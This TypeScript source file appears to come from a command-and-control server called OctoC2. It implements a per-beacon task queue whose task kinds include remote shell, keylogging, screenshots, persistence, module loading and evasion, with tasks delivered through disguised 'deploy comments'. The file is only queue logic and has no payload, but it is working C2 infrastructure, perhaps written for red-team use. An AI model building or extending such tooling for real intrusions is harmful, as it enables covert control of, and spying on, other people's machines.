/**
 * OctoC2 Server — TaskQueue
 *
 * Per-beacon in-memory task queue. Supports lifecycle states:
 *   pending   → task created, not yet delivered to beacon
 *   delivered → deploy comment posted, awaiting beacon acknowledgement
 *   completed → beacon posted a result comment (success or failure)
 *   failed    → delivery timed out or explicit operator cancel
 *
 * Thread safety: single-threaded Bun runtime — no locks needed.
 */

export type TaskState = "pending" | "delivered" | "completed" | "failed";

export type TaskKind =
  | "shell"
  | "upload"
  | "download"
  | "screenshot"
  | "keylog"
  | "persist"
  | "unpersist"
  | "sleep"
  | "die"
  | "load-module"
  | "ping"
  | "evasion";

export interface QueuedTask {
  taskId:      string;
  beaconId:    string;
  kind:        TaskKind;
  args:        Record<string, unknown>;
  state:       TaskState;
  createdAt:   string;  // ISO-8601
  deliveredAt: string | null;
  completedAt: string | null;
  /** Ref token embedded in the deploy comment heartbeat line (e.g. "maint-a3f9") */
  ref:         string;
  /** Raw result payload from beacon, if completed */
  result:      string | null;
  /**
   * If set, only the named tentacle channel should deliver this task.
   * Channels skip tasks where this field is set to a different kind.
   */
  preferredChannel?: string | undefined;
}

export class TaskQueue {
  /** beaconId → ordered list of tasks */
  private readonly queues = new Map<string, QueuedTask[]>();
  /** taskId → QueuedTask (O(1) lookup) */
  private readonly taskIndex = new Map<string, QueuedTask>();
  /** ref → QueuedTask (O(1) lookup) */
  private readonly refIndex = new Map<string, QueuedTask>();

  /**
   * Add a new task for a beacon. Generates a short ref token used in the
   * deploy comment heartbeat line so the beacon can correlate results.
   */
  queueTask(
    beaconId: string,
    kind: TaskKind,
    args: Record<string, unknown> = {},
    preferredChannel?: string,
  ): QueuedTask {
    const taskId = crypto.randomUUID();
    const ref    = taskId.slice(0, 8);  // first 8 hex chars as short ref

    const task: QueuedTask = {
      taskId,
      beaconId,
      kind,
      args,
      state:       "pending",
      createdAt:   new Date().toISOString(),
      deliveredAt: null,
      completedAt: null,
      ref,
      result:      null,
      ...(preferredChannel !== undefined && { preferredChannel }),
    };

    const queue = this.queues.get(beaconId) ?? [];
    queue.push(task);
    this.queues.set(beaconId, queue);
    this.taskIndex.set(taskId, task);
    this.refIndex.set(ref, task);

    console.log(`[TaskQueue] Queued task ${taskId} (${kind}) for beacon ${beaconId}`);
    return task;
  }

  /** Return all pending tasks for a beacon (ready to be delivered). */
  getPendingTasks(beaconId: string): QueuedTask[] {
    return (this.queues.get(beaconId) ?? []).filter(t => t.state === "pending");
  }

  /** Return all tasks for a beacon regardless of state. */
  getAllTasks(beaconId: string): QueuedTask[] {
    return [...(this.queues.get(beaconId) ?? [])];
  }

  getTask(taskId: string): QueuedTask | undefined {
    return this.taskIndex.get(taskId);
  }

  /** Find a task by its short ref token. */
  getTaskByRef(ref: string): QueuedTask | undefined {
    return this.refIndex.get(ref);
  }

  /**
   * Mark a task as delivered (deploy comment posted).
   * Returns false if task not found or not in pending state.
   */
  markDelivered(taskId: string): boolean {
    const task = this.getTask(taskId);
    if (!task || task.state !== "pending") return false;

    task.state       = "delivered";
    task.deliveredAt = new Date().toISOString();
    return true;
  }

  /**
   * Mark a task as completed with an optional result payload.
   * Accepts tasks in either pending or delivered state (beacon may respond
   * before the server records delivery in an edge case).
   */
  markCompleted(taskId: string, result: string | null = null): boolean {
    const task = this.getTask(taskId);
    if (!task || task.state === "completed" || task.state === "failed") return false;

    task.state       = "completed";
    task.completedAt = new Date().toISOString();
    task.result      = result;

    console.log(`[TaskQueue] Task ${taskId} completed for beacon ${task.beaconId}`);
    return true;
  }

  /** Mark a task as failed (timeout, operator cancel, delivery error). */
  markFailed(taskId: string): boolean {
    const task = this.getTask(taskId);
    if (!task || task.state === "completed" || task.state === "failed") return false;

    task.state       = "failed";
    task.completedAt = new Date().toISOString();

    console.log(`[TaskQueue] Task ${taskId} failed for beacon ${task.beaconId}`);
    return true;
  }

  /**
   * Expire delivered tasks that have not been completed within `timeoutMs`.
   * Called on each poll cycle.
   */
  sweepExpired(timeoutMs = 30 * 60 * 1000): void {
    const cutoff = Date.now() - timeoutMs;
    for (const queue of this.queues.values()) {
      for (const task of queue) {
        if (
          task.state === "delivered" &&
          task.deliveredAt !== null &&
          new Date(task.deliveredAt).getTime() < cutoff
        ) {
          task.state       = "failed";
          task.completedAt = new Date().toISOString();
          console.log(`[TaskQueue] Task ${task.taskId} expired (delivery timeout)`);
        }
      }
    }
  }
}
